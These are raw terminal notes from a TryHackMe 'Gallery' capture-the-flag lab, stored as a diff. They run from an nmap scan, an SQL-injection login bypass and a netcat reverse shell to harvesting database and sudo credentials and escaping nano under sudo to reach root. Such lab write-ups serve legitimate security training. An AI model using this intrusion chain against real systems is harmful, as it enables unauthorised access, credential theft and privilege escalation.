@@ -1,0 +1,260 @@
+└─$ nmap -sC -sV -A 10.10.117.146 -Pn
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-14 08:05 EST
+Nmap scan report for 10.10.117.146
+Host is up (0.30s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Simple Image Gallery System
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 199.60 seconds
+                                       
+
+scan with dir found $IP:8080/gallery
+
+and 
+user sqli attack on login page like admin' or --
+
+upload payload and update
+
+
+
+
+(kevin㉿kali)-[~/CTF/THM_galary]
+└─$ nc -nlvp 9999     
+listening on [any] 9999 ...
+connect to [10.8.1.147] from (UNKNOWN) [10.10.82.6] 44420
+Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 17:25:07 up 40 min,  0 users,  load average: 0.00, 0.00, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@gallery:/$ cd /var/www/html/gallery
+cd /var/www/html/gallery
+www-data@gallery:/var/www/html/gallery$ ls
+ls
+404.html  build               database  index.php       report       user
+albums    classes             dist      initialize.php  schedules
+archives  config.php          home.php  login.php       system_info
+assets    create_account.php  inc       plugins         uploads
+www-data@gallery:/var/www/html/gallery$ cat initialize.php
+cat initialize.php
+<?php
+$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+
+if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
+if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
+if(!defined('dev_data')) define('dev_data',$dev_data);
+if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
+if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
+?>
+www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
+mysql -u gallery_user -p
+Enter password: passw0rd321
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 56
+Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| gallery_db         |
+| information_schema |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> use gallery_db
+use gallery_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [gallery_db]> show tables;
+show tables;
++----------------------+
+| Tables_in_gallery_db |
++----------------------+
+| album_list           |
+| images               |
+| system_info          |
+| users                |
++----------------------+
+4 rows in set (0.00 sec)
+
+MariaDB [gallery_db]> select * from users;
+select * from users;
++----+--------------+----------+----------+----------------------------------+-----------------------------+------------+------+---------------------+---------------------+
+| id | firstname    | lastname | username | password                         | avatar                      | last_login | type | date_added          | date_updated        |
++----+--------------+----------+----------+----------------------------------+-----------------------------+------------+------+---------------------+---------------------+
+|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1644773100_B15h.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-02-13 17:25:02 |
++----+--------------+----------+----------+----------------------------------+-----------------------------+------------+------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+MariaDB [gallery_db]> 
+
+
+www-data@gallery:/$ cd /var/backups/mike_home_backup/
+www-data@gallery:/var/backups/mike_home_backup$ cat .
+./             .bash_history  .bashrc        .profile       
+../            .bash_logout   .gnupg/        
+www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -lb3stpassw0rdbr0xx
+clear
+sudo -l
+exit
+www-data@gallery:/var/backups/mike_home_backup$ su mike                  
+Password: 
+mike@gallery:/var/backups/mike_home_backup$ cd  
+mike@gallery:~$ ls -la
+total 44
+drwxr-xr-x 6 mike mike 4096 Aug 25 09:15 .
+drwxr-xr-x 4 root root 4096 May 20  2021 ..
+-rw------- 1 mike mike  135 May 24  2021 .bash_history
+-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
+drwx------ 2 mike mike 4096 May 24  2021 documents
+drwx------ 3 mike mike 4096 May 20  2021 .gnupg
+drwx------ 2 mike mike 4096 May 24  2021 images
+drwxrwxr-x 3 mike mike 4096 Aug 25 09:15 .local
+-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
+-rwx------ 1 mike mike   32 May 14  2021 user.txt
+mike@gallery:~$ 
+
+otal 44
+drwxr-xr-x 6 mike mike 4096 Aug 25 09:15 .
+drwxr-xr-x 4 root root 4096 May 20  2021 ..
+-rw------- 1 mike mike  135 May 24  2021 .bash_history
+-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
+drwx------ 2 mike mike 4096 May 24  2021 documents
+drwx------ 3 mike mike 4096 May 20  2021 .gnupg
+drwx------ 2 mike mike 4096 May 24  2021 images
+drwxrwxr-x 3 mike mike 4096 Aug 25 09:15 .local
+-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
+-rwx------ 1 mike mike   32 May 14  2021 user.txt
+mike@gallery:~$ cat user.txt 
+THM{af05cd30bfed67849befd546ef}
+mike@gallery:~$ ls -la
+total 44
+drwxr-xr-x 6 mike mike 4096 Aug 25 09:15 .
+drwxr-xr-x 4 root root 4096 May 20  2021 ..
+-rw------- 1 mike mike  135 May 24  2021 .bash_history
+-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
+drwx------ 2 mike mike 4096 May 24  2021 documents
+drwx------ 3 mike mike 4096 May 20  2021 .gnupg
+drwx------ 2 mike mike 4096 May 24  2021 images
+drwxrwxr-x 3 mike mike 4096 Aug 25 09:15 .local
+-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
+-rwx------ 1 mike mike   32 May 14  2021 user.txt
+mike@gallery:~$ cat .bash_history
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -lb3stpassw0rdbr0xx
+clear
+sudo -l
+exit
+mike@gallery:~$ sudo -l
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+mike@gallery:~$ cat /opt/rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+mike@gallery:~$ /bin/bash -p
+mike@gallery:~$ sudo -u root bash /opt/rootkit.sh 
+Would you like to versioncheck, update, list or read the report ? read
+Error opening terminal: unknown.
+mike@gallery:~$ sudo -u root bash /opt/rootkit.sh 
+Would you like to versioncheck, update, list or read the report ? read
+Error opening terminal: unknown.
+mike@gallery:~$ nano                              
+Error opening terminal: unknown.
+mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
+Would you like to versioncheck, update, list or read the report ? read
+Error opening terminal: unknown.
+mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
+Would you like to versioncheck, update, list or read the report ? read
+Error opening terminal: unknown.
+mike@gallery:~$ export TERM=xterm; export SHELL=/bin/bash
+mike@gallery:~$ stty raw -echo;fg
+bash: fg: current: no such job
+                              mike@gallery:~$export TERM=xterm; export SHELL=/bin/bash 
+
+mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
+^R^X
+reset; sh 1>&0 2>&0
+
+total 52
+drwx------  6 root root 4096 Feb 14 13:27 .
+drwxr-xr-x 23 root root 4096 Feb 12 21:42 ..
+-rw-------  1 root root  364 Feb 12 21:38 .bash_history
+-rw-r--r--  1 root root 3107 May 20  2021 .bashrc
+drwx------  2 root root 4096 Feb 12 21:28 .cache
+drwx------  3 root root 4096 Feb 12 21:28 .gnupg
+drwxr-xr-x  3 root root 4096 May 20  2021 .local
+-rw-------  1 root root  440 Aug 25 09:19 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root 3404 May 18  2021 report.txt
+-rw-r--r--  1 root root 1024 Feb 14 13:27 .report.txt.swp
+-rw-r--r--  1 root root   43 May 17  2021 root.txt
+drwx------  2 root root 4096 May 20  2021 .ssh
+# cat root.txt
+THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
+# 
